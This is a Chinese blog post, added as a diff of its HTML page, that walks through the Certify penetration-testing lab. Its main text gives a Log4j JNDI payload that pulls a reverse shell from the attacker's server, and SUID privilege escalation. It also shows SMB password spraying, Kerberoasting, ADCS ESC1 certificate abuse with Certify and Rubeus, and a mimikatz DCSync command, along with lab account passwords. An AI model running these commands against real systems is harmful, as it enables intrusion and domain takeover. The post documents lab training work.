@@ -1,0 +1,685 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
+  <link rel="icon" href="/img/Avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suuuu">
+  <meta name="keywords" content="blog">
+  
+    <meta name="description" content="发现存在一个solr关键点大概就这些https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44862511&#x2F;article&#x2F;details&#x2F;132131710与网上Log4j复现环境基本一样，那我们还是先验证一下http:&#x2F;&#x2F;39.99.138.172:8983&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;sys:java.version">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Certify">
+<meta property="og:url" content="https://www.susec.xyz/2025/04/04/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/index.html">
+<meta property="og:site_name" content="suuuu&#39;s blog">
+<meta property="og:description" content="发现存在一个solr关键点大概就这些https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44862511&#x2F;article&#x2F;details&#x2F;132131710与网上Log4j复现环境基本一样，那我们还是先验证一下http:&#x2F;&#x2F;39.99.138.172:8983&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;sys:java.version">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310150124191.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310150218738.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310150456117.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310151615984.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152055507.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152158563.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152256714.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152504248.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152540405.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310153024555.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310154417942.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325092337984.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325093631258.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325093842753.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094320113.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094336795.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094401283.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094121659.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325100402676.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325095731196.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329211812877.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325102401720.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325102930072.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329162241955.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329163446958.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329163758256.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329164025615.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329222733609.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329222804794.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329223228227.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329223635039.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329225527815.png">
+<meta property="article:published_time" content="2025-04-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-03T06:42:52.623Z">
+<meta property="article:author" content="suuuu">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310150124191.png">
+  
+  
+  
+  <title>春秋云镜-Certify - suuuu&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.susec.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suuuu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/BlackRoses.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜-Certify"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-04 00:00" pubdate>
+          2025年4月4日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          945 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜-Certify</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310150124191.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现存在一个solr<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310150218738.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>关键点大概就这些<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44862511/article/details/132131710">https://blog.csdn.net/weixin_44862511/article/details/132131710</a><br>与网上Log4j复现环境基本一样，那我们还是先验证一下<br><code>http://39.99.138.172:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.ciygew.dnslog.cn&#125;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310150456117.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>没问题，那就直接一把梭了，访问一下网站即可<br><code>http://39.99.138.172:8983/solr/admin/cores?action=$&#123;jndi:ldap://vpsip:1389/Basic/ReverseShell/vpsip/4444&#125;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310151615984.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>成功<br>先找找flag在哪<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152055507.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>根据春秋云镜的习惯，一般来说都是命名为flag01，既然没有，那就是要提权<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152158563.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现有个grc是特殊权限，直接提<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/grc/">https://gtfobins.github.io/gtfobins/grc/</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152256714.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152504248.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310152540405.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>完成<br>那我们接下来做做信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310153024555.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>fscan直接扫<br>整理一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250310154417942.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>首先DC是扫出来一个adcs的漏洞<br>这里我们通过vshell上线入口机，作为据点<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325092337984.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>adcs的漏洞并不能直接用，我们还是缺少了突破口，fscan扫的结果还是略有欠缺，但我们的攻打思路应该是先fileserver，我们在fscan的结果中看到它有ftp跟smb，试试这两个的未授权<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325093631258.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>smb连接成功</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">smbclient --<span class="hljs-keyword">no</span>-pass -<span class="hljs-keyword">L</span> ip<br>smbclient -<span class="hljs-keyword">N</span> <span class="hljs-comment">//ip/dir</span><br><span class="hljs-keyword">dir</span><br><span class="hljs-keyword">cd</span><br><span class="hljs-keyword">dir</span><br>get flag02.txt<br></code></pre></td></tr></table></figure>
+<p>这个secret一看就有东西，看看先<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325093842753.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>get flag02.txt弄下来<br>db跟7z当然也不能放过<br>把db导入navicat，连接选择sqlite然后导入即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094320113.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>里面有很多数据<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094336795.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094401283.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>还有几个对用户名打码，密码不打码的，我们试着拿邮箱+密码进行爆破<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325094121659.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>7z里面是一个对adcs的解释文档，没什么用<br>那我们就开始爆破<br> proxychains4 -q crackmapexec smb 172.22.9.1&#x2F;24 -u .&#x2F;user.txt -p .&#x2F;pass.txt<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325100402676.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>爆破出来之后我们试着远程登陆一下，把活着的主机的3389扫一遍<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325095731196.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>7跟26，刚好是没拿下的两台机器<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329211812877.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>连不上，那我们只能换个思路，因为我们虽然连不上，但是是可以看出来这两个是真实存在的用户，密码也是对的，再加上flag2提示spn，我们就可以打一下Kerberoast攻击<br><code>proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325102401720.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>拿到hashcat进行爆破<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250325102930072.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>爆破出结果<br>我们再通过windows自带的连接172.22.9.26就能成功<br>账号：<code>zhangxia@xiaorang.lab</code><br>密码：<code>MyPass2@@6</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329162241955.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>但是权限不高，我们再想想怎么提权<br>还记得前面扫出来的一个active directory certsrv detect<br>这里我们就可以试着打一打，上传certify看看<br>certify.exe find &#x2F;vulnerable<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329163446958.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><strong>ESC1利用前提条件：</strong><br>msPKI-Certificates-Name-Flag:<br>ENROLLEE_SUPPLIES_SUBJECT<br>表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户  </p>
+<p>PkiExtendedKeyUsage: Client Authentication<br>表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证</p>
+<p>Enrollment Rights: NT Authority\Authenticated Users<br>表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书<br>发现了漏洞接下来就跟套公式一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ESC1打法">Certify.exe request /ca:【CA Name】 /template:VulnTemplate /altname:domainadmin<br>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx<br>Rubeus.exe asktgt /user:&lt;$adUserToImpersonate&gt; /certificate:cert.pfx /ptt<br></code></pre></td></tr></table></figure>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329163758256.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这里就是把上面的BEGIN开始一直到END CERTIFICATE全部复制下来保存到cert.pem，要你输密码就直接enter就行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329164025615.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这里注意，有个巨坑，win2016不支持openssl3.0以上的证书（aes-256加密），这里我们要用openssl1.1.0的去生成，不然会报密码错误（还有一些玄学问题我也没研究出，如：KDC_ERR_PADATA_TYPE_NOSUPP，不行就多试几次，重置一下环境）<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329222733609.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>成功拿到ticket，我们的票据也显示的是admin<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329222804794.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>那我们就那mimikatz抓一波凭据<br><code>mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329223228227.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后就是简单的一波wmi横向<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329223635039.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这里简单证明，剩下的就是找flag，没什么难度，最后的最后，我们再对整次渗透进行一个复盘<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250329225527815.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6/" class="category-chain-item">打靶</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%89%93%E9%9D%B6/" class="print-no-link">#打靶</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91/" class="print-no-link">#内网</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜-Certify</div>
+      <div>https://www.susec.xyz/2025/04/04/春秋云境-Certify/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suuuu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/04/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/" title="春秋云镜-Time">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜-Time</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/04/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY16-Rootme/" title="重生之我在try hack me打靶，励志成为赛博高手-DAY16-Rootme">
+                        <span class="hidden-mobile">重生之我在try hack me打靶，励志成为赛博高手-DAY16-Rootme</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
